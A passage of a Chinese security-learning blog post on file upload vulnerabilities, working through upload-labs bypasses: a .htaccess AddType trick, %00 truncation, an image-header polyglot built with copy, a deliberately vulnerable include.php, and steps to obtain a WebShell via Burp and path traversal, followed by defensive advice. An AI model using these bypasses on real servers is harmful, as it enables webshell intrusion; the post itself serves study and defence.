class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该代码对常见的多种类型文件后缀名进行了限制上传，但是仔细可以发现，并没有对<code>htaccess</code>文件进行限制。于是，我们可以先上传一个<code>htaccess</code>文件，再上传一个图片马，进行绕过检测上传。</p>
+<p>.htaccess文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+<p>这样所有文件都会当成php来解析</p>
+<h2 id="绕过白名单检测"><a href="#绕过白名单检测" class="headerlink" title="绕过白名单检测"></a>绕过白名单检测</h2><p>白名单策略：文件扩展名不在白名单中为不合法。</p>
+<p>绕过方法：服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用00截断的方<br>式进行绕过。如应用本来只允许上传jpg图片，那么可以构造文件名为<code>xxx.php%00.jpg</code>,其中<code>%00</code>为十六进制的<code>0x00</code>字符，.jpg骗过了应用的上传文件类型检测，但对于服务器来说，因为<code>%00</code>字符截断的关系，最终上传的文件变成了<code>xxx.php</code>。</p>
+<p>测试：upload-labs/Pass-12</p>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232436067.png" alt="image-20210418232436067"></p>
+<p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p>
+</blockquote>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232327452.png" alt="image-20210418232327452"></p>
+<h2 id="绕过文件内容检测"><a href="#绕过文件内容检测" class="headerlink" title="绕过文件内容检测"></a>绕过文件内容检测</h2><p>文件头校验原理：判断文件头内容是否符合要求。</p>
+<p>常见的文件头对应关系：</p>
+<ul>
+<li>.jpeg、jpg：JPGGraphicFile</li>
+<li>.gif：GIF 89A</li>
+<li>.zip：Zip Compressed</li>
+</ul>
+<p>绕过文件头检查：上传图片马，通过添加文件头绕过图片类型内容检查。</p>
+<p>突破getimagesize()函数：图像文件相关信息常用检测函数，用以获取文件类型，绕过只需要把文件头部分伪造好。</p>
+<p>测试：upload-labs/Pass-14</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马(cmd下copy命令)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.gif /b + test.php /a shell.gif</span><br></pre></td></tr></table></figure>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143058835.png" alt="image-20210424143058835"></p>
+<p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143216004.png" alt="image-20210424143216004"></p>
+<h1 id="上传漏洞检测"><a href="#上传漏洞检测" class="headerlink" title="上传漏洞检测"></a>上传漏洞检测</h1><ol>
+<li>登陆网站，并打开文件上传页面。</li>
+<li>点击“浏览”按钮，并选择本地的一个JSP文件(比如 hacker.jsp)，确认上传。</li>
+<li>如果客户端脚本限制了上传文件的类型(比如允许gif文件)，则把 hacker.jsp 更名为 hacker.gif；配置 HTTP Proxy(burp) 进行 http 请求拦截；重新点击“浏览”按钮，并选择 hacker.gift，确认上传。</li>
+<li>在WebScarab拦截的HTTP请求数据中，将 hacker.gif 修改为 hacker.jsp，再发送请求数据。</li>
+<li>登陆后台服务器，用命令<code>find / -name hacker.jsp</code>查看 hacker.jsp 文件存放的路径。如果可以直接以Web方式访问，则构造访问的URL，并通过浏览器访问 hacker.jsp，如果可以正常访问，则已经取得WebShell，测试结束。如果 hacker.jsp 无法通过 web 方式访问，例如 hacker.jsp 存放在 /home/tmp/ 目录下，而 /home/tomcat/webapps 目录对应<a target="_blank" rel="noopener" href="http://www.example.com/%EF%BC%8C%E5%88%99%E8%BF%9B%E8%A1%8C%E4%B8%8B%E4%B8%80%E6%AD%A5%E3%80%82">http://www.example.com/，则进行下一步。</a></li>
+<li>重复1～3，在burp拦截的HTTP请求数据中，将hacker.gif修改为../tomcat/webapps/hacker.jsp，再发送请求数据。在浏览器地址栏输入<a target="_blank" rel="noopener" href="http://www.example.com/hacker.jsp%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%AF%A5%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%8F%96%E5%BE%97WebShell%EF%BC%8C%E7%BB%93%E6%9D%9F%E6%A3%80%E6%B5%8B%E3%80%82">http://www.example.com/hacker.jsp，访问该后门程序，取得WebShell，结束检测。</a></li>
+</ol>
+<h1 id="上传漏洞防御"><a href="#上传漏洞防御" class="headerlink" title="上传漏洞防御"></a>上传漏洞防御</h1><ol>
+<li>文件上传的目录设置为不可执行<br>最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的’x’权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性。</li>
+<li>判断文件类型<br>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li>
+<li>使用随机数改写文件名和文件路径<br>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</li>
+<li>单独设置文件服务器的域名<br>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Web安全-文件上传漏洞与WAF绕过</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/92799366">upload-labs通关记录</a></p>
+</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>文件上传漏洞学习</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://www.wawyw.top/posts/13382.html">https://www.wawyw.top/posts/13382.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a" style="display: inline-block;width: 120px"><h>作者</h><div class="post-copyright-cc-info"><h>wawyw</h></div></div><div class="post-copyright-c" style="display: inline-block;width: 120px"><h>发布于</h><div class="post-copyright-cc-info"><h>2021-04-24</h></div></div><div class="post-copyright-u" style="display: inline-block;width: 120px"><h>更新于</h><div class="post-copyright-cc-info"><h>2021-04-24</h></div></div><div class="post-copyright-c" style="display: inline-block;width: 120px"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">Web安全学习</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post_share"><div class="social-share" data-image="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fileUpload.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/19226.html"><img class="next-cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/xxe.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XXE漏洞学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/33839.html" title="CSRF“苏醒的巨人”"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/hacker.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-23</div><div class="title">CSRF“苏醒的巨人”</div></div></a></div><div><a href="/posts/36028.html" title="MySQL默认库及读写文件"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/mysql.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">MySQL默认库及读写文件</div></div></a></div><div><a href="/posts/8774.html" title="MySQL基础操作学习"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/rdbms.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-19</div><div class="title">MySQL基础操作学习</div></div></a></div><div><a href="/posts/33159.html" title="SQL注入环境搭建和代码编写"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/u=3582485922,1626011992&fm=26&gp=0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-07</div><div class="title">SQL注入环境搭建和代码编写</div></div></a></div><div><a href="/posts/18466.html" title="SSRF漏洞学习"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ssrf.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-01</div><div class="title">SSRF漏洞学习</div></div></a></div><div><a href="/posts/19226.html" title="XXE漏洞学习"><img class="cover" src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/xxe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-13</div><div class="title">XXE漏洞学习</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">文件上传简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">绕过文件检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">绕过客户端检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87MIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B"><span class="toc-number">2.2.</span> <span class="toc-text">绕过MIME类型检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B"><span class="toc-number">2.3.</span> <span class="toc-text">绕过黑名单检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B"><span class="toc-number">2.4.</span> <span class="toc-text">绕过白名单检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="toc-number">2.5.</span> <span class="toc-text">绕过文件内容检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">上传漏洞检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">上传漏洞防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> wawyw</div><div class="footer_custom_text"><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank" href="https://coding.net/"><img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站项目由 Coding 托管" alt="Coding"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><p style="margin-top:"><a target="_blank" rel="external nofollow" href="https://beian.miit.gov.cn/"><img src="https://cdn.jsdelivr.net/gh/zjwo/CDN@master/img/blog/icp.png" style="vertical-align:text-bottom">&nbsp;赣ICP备2021001120号-1</a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    let initData = {
+      el: '#twikoo-wrap',
+      envId: 'twikoo-0gsrqna13c1dc448',
+      region: ''
+    }
+
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    twikoo.init(initData)
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'twikoo-0gsrqna13c1dc448',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer data-pjax src="/js/change.js"></script><script defer data-pjax src="/js/history.js"></script><script defer src="https://cdn.jsdelivr.net/gh/graingert/wow@1.3.0/dist/wow.min.js"></script><script defer data-pjax src="/js/wow_init.js"></script><script defer src="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/js/main.js"></script><script async data-pjax src="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io@1.4.7/js/custom/pace.min.js"></script><div defer class="app-refresh" id="app-refresh"> <div class="app-refresh-wrap"> <label>✨ 网站已更新最新版本 👉</label> <a href="javascript:void(0)" onclick="location.reload()">点击刷新</a> </div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"已更新最新版本",backgroundColor:t,duration:5e5,pos:e,actionText:"点击刷新",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",function(){showNotification()}),window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")}));</script><scrip async src="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js"></scrip><div class="aplayer no-destroy aplayer-withlist" data-id="7877671363" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="18px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config_change',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '#posts-chart',
+  '#tags-chart',
+  '#categories-chart',  
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
